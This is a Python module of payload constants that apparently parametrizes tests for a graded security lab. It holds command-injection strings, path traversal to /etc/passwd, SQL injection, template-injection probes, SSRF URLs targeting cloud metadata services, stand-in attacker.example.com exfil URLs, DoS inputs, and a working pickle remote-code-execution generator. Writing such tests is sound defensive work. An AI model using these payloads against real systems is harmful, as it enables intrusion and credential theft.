"""
Attack payload constants for test parametrization.

All payloads are used in sandbox mode — no real system damage occurs.
Organized by attack class so new tests can easily import what they need.
"""

# ── Command Injection (BEGINNER-002) ─────────────────────────────────────────

CMD_SAFE = [
    "echo hello",
    "ls",
    "whoami",
    "date",
]

CMD_INJECTION = [
    ("semicolon",    "echo hello; whoami"),
    ("and_operator", "echo hello && id"),
    ("pipe",         "ls | head"),
    ("subshell",     "echo $(id)"),
    ("backtick",     "echo `hostname`"),
    ("newline",      "echo hello\nwhoami"),
    ("or_operator",  "false || id"),
]

# ── Path Traversal (BEGINNER-003) ─────────────────────────────────────────────

PATH_SAFE = [
    "README.md",
    "server.py",
    "config.py",
]

PATH_TRAVERSAL = [
    ("one_up",     "../config.py"),
    ("flags",      "../flags/flags.py"),
    ("two_up",     "../../etc/hosts"),
    ("absolute",   "/etc/passwd"),
    ("dot_slash",  "./../config.py"),
]

# ── SQL Injection (INTERMEDIATE-002) ─────────────────────────────────────────

SQL_SAFE = [
    "alice",
    "bob",
    "carol",
]

SQL_INJECTION = [
    ("tautology",      "' OR '1'='1"),
    ("comment",        "admin' --"),
    ("union",          "' UNION SELECT 1,'x','admin','FLAG' --"),
    ("always_true",    "' OR 1=1 --"),
    ("quote_escape",   "'; SELECT * FROM users --"),
]

# ── Template Injection (ADVANCED-002) ────────────────────────────────────────

TEMPLATE_SAFE = [
    "Hello world",
    "{{ name }}",
    "{% for i in range(3) %}{{ i }}{% endfor %}",
]

TEMPLATE_SSTI = [
    ("math",         "{{ 7 * 7 }}",                              "49"),
    ("class",        "{{ ''.__class__ }}",                        "<class 'str'>"),
    ("mro",          "{{ ''.__class__.__mro__ }}",               "object"),
    ("subclasses",   "{{ ''.__class__.__mro__[1].__subclasses__() }}", "__subclasses__"),
]

# ── SSRF (ADVANCED-001) ───────────────────────────────────────────────────────

URL_SAFE = [
    "http://attacker.example.com/inject",   # simulated — handled offline
    "http://attacker.example.com/exfil",
]

URL_SSRF = [
    ("localhost_admin",  "http://localhost/admin"),
    ("loopback_admin",   "http://127.0.0.1/admin"),
    ("aws_metadata",     "http://169.254.169.254/latest/meta-data/"),
    ("gcp_metadata",     "http://metadata.google.internal/computeMetadata/v1/"),
    ("alibaba_metadata", "http://100.100.100.200/latest/meta-data/"),
]

# ── Pickle Payloads (ADVANCED-004) ────────────────────────────────────────────

import base64
import pickle

def make_pickle_payload(cmd: str = "id") -> str:
    """Generate a base64-encoded pickle RCE payload."""
    import os

    class Exploit:
        def __reduce__(self):
            return (os.system, (cmd,))

    return base64.b64encode(pickle.dumps(Exploit())).decode()


PICKLE_PAYLOAD = make_pickle_payload("id")
PICKLE_INVALID_B64 = "not-valid-base64!!!"
PICKLE_BENIGN = base64.b64encode(pickle.dumps({"key": "value"})).decode()

# ── DoS Inputs (ADVANCED-003) ────────────────────────────────────────────────

FIB_SAFE = [1, 5, 10, 20, 35]
FIB_DOS = [36, 40, 45, 50]

PERM_SAFE = ["ab", "abc", "abcd", "abcdefgh"]      # 2, 6, 24, 40320 — <= 8 chars OK
PERM_DOS = ["abcdefghi", "abcdefghij", "abcdefghijk"]  # 9! = 362K, > sandbox limit

FLOOD_SAFE_COUNT = 5
FLOOD_DOS_COUNT = 100
